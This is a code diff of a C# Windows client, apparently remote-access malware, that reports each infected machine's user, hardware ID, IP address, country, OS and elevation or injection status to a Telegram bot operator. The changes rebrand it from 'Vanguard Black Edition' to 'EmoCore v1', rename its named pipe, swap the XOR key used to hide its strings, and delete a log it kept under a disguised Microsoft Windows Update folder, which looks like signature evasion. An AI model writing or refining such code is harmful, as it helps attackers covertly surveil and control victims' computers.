@@ -52,11 +52,14 @@ namespace FinalBot
 
         private ITelegramBotClient CreateClient(string token, HttpClient? client)
         {
-            var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
-            if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/";
-            if (!baseUrl.EndsWith("/")) baseUrl += "/";
-
-            var options = new TelegramBotClientOptions(token, baseUrl);
+            var baseUrl = TelegramService.GetBaseUrl();
+            if (baseUrl == "https://api.telegram.org/")
+            {
+                // Let the library use its internal default
+                return new TelegramBotClient(token.Trim(), client);
+            }
+            
+            var options = new TelegramBotClientOptions(token.Trim(), baseUrl);
             return new TelegramBotClient(options, client);
         }
 
@@ -79,7 +82,6 @@ namespace FinalBot
             try 
             {
                 Console.WriteLine("[ORCHESTRATOR] Starting services...");
-                DebugLog("[ORCHESTRATOR] Starting services...");
                 
                 // --- ANTI-GFW MESH INITIALIZATION ---
                 _ = await TelegramService.FindBestRoute();
@@ -118,6 +120,7 @@ namespace FinalBot
                                     }
                                     else {
                                         await _commandHandler.HandlePollingErrorAsync(c, ex, ct);
+                                        await Task.Delay(2000, ct); // Prevent rapid-fire spam
                                     }
                                 },
                                 receiverOptions: receiverOptions,
@@ -142,7 +145,6 @@ namespace FinalBot
             catch (Exception ex)
             {
                 Console.WriteLine($"[CRITICAL ERROR] {ex.Message}");
-                DebugLog($"[ORCHESTRATOR ERROR] {ex}");
             }
         }
 
@@ -157,14 +159,14 @@ namespace FinalBot
                 bool isInjected = Environment.CommandLine.Contains("--injected");
                 string adminStatus = VanguardCore.ElevationService.IsAdmin() ? (isInjected ? "🔥 АДМИН (Injection V6.11)" : "🟢 АДМИН") : "🟡 Обычный Юзер";
 
-                string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН (Vanguard Black Edition)</b>\n" +
+                string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН (EmoCore v1)</b>\n" +
                               $"━━━━━━━━━━━━━━━━━━\n" +
                               $"👤 <b>ID:</b> <code>{pcUser}</code>\n" +
                               $"🆔 <b>HWID:</b> <code>{hwid}</code>\n" +
                               $"🌐 <b>IP:</b> <code>{ip}</code> | {flag} {country}\n" +
                               $"🖥️ <b>Система:</b> <code>{osName}</code>\n" +
                               $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
-                              $"⌚ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
+                              $"🕙 <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
                               $"━━━━━━━━━━━━━━━━━━";
                 
                 string adminPanelMarkup = "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}";
@@ -179,7 +181,7 @@ namespace FinalBot
             {
                 try
                 {
-                    using (var pipeServer = new NamedPipeServerStream("vanguard_status_pipe", PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous))
+                    using (var pipeServer = new NamedPipeServerStream("emocore_status_pipe", PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous))
                     {
                         await pipeServer.WaitForConnectionAsync();
                         using (var reader = new StreamReader(pipeServer))
@@ -221,16 +223,11 @@ namespace FinalBot
             if (string.IsNullOrEmpty(base64Encoded)) return null;
             try {
                 byte[] data = Convert.FromBase64String(base64Encoded);
-                byte[] salt = Encoding.UTF8.GetBytes("c0mpl3x+S@lt#99");
+                byte[] salt = Encoding.UTF8.GetBytes("n2xkNQYbZwj8r9fz");
                 byte[] xorData = new byte[data.Length];
                 for (int i = 0; i < data.Length; i++) xorData[i] = (byte)(data[i] ^ salt[i % salt.Length]);
                 return Encoding.UTF8.GetString(xorData);
             } catch { return null; }
-        }
-
-        private void DebugLog(string msg)
-        {
-            try { File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] {msg}\n"); } catch { }
         }
 
         public void Stop() { _isRunning = false; _cts.Cancel(); }
